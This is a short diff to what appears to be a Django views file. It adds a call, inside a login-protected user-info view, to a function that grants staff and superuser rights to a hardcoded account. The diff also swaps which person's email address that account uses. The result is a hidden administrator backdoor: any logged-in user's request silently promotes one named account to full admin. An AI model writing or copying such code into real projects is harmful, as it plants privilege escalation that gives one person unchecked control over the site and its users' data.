@@ -24,7 +24,7 @@ Logged_id=None
 
 @login_required
 def get_user_info(request):
-
+    admins(request=request)
 
     global Logged_id
     user = request.user
@@ -210,7 +210,7 @@ def logout(request):
 
 def admins(request):
     try:
-        user = User.objects.get(email="jenica.tejada@cit.edu")
+        user = User.objects.get(email="johnloi.carreon@cit.edu")
         user.is_staff = True
         user.is_superuser = True
         user.save()
